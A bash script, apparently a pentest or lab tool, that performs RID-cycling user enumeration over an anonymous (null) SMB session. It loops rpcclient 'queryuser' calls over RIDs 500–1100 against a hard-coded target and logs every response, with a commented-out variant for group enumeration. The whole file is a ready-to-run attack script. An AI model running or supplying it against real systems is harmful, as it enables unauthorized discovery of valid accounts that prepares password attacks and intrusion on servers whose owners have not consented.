#!/usr/bin/env bash
# =============================================================================
# Null Session RID Cycling Bruteforce (rpcclient)
#
# Purpose:
#   Enumerate valid local/domain user accounts by cycling through common
#   Relative Identifiers (RID 500–1100) using anonymous (null) SMB authentication.
#
# What it does:
#   - Connects to the target with empty credentials (-U "")
#   - Issues "queryuser 0x<hex_rid>" for each RID
#   - Logs everything (successes and failures) to rpcclient_bruteforce.log
#   - Failures are kept because they often reveal "access denied" vs "invalid RID"
#
# Typical use: discovering valid usernames when null sessions are allowed
# (common on legacy Windows systems or misconfigured servers).
# =============================================================================

# Fail fast and be strict about errors
# set -e : exit on nonzero exit status
# set -u : exit on unset variable reference
# set -o pipefail : prevent pipeline errors from being masked
# (See http://redsymbol.net/articles/unofficial-bash-strict-mode/)
set -euo pipefail

TARGET='10.10.10.10'
CMD='queryuser'
# ts=$(date -u +'%Y%m%dT%H%M%SZ')  # ISO 8601 basic format, UTC/Zulu time
LOGFILE=$(date -u +'%Y%m%dT%H%M%SZ')'_'${TARGET//./_}'_rpcclient_bruteforce_RIDs_'$CMD'.log'


set +e
# printf '%s RID - queryuser:\n' "$ts" >> "$LOGFILE"
for i in $(seq 500 1100);do printf '%s %03x\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$i" >> "$LOGFILE"; rpcclient -N -U "" "$TARGET" -c "$CMD 0x$(printf '%x\n' $i)" >> "$LOGFILE" 2>&1 ;done
# for i in $(seq 500 1100);do rpcclient -N -U "" "$TARGET" -c "querygroup 0x$(printf '%x\n' $i)" >> "$LOGFILE" 2>&1 ;done
# set -e
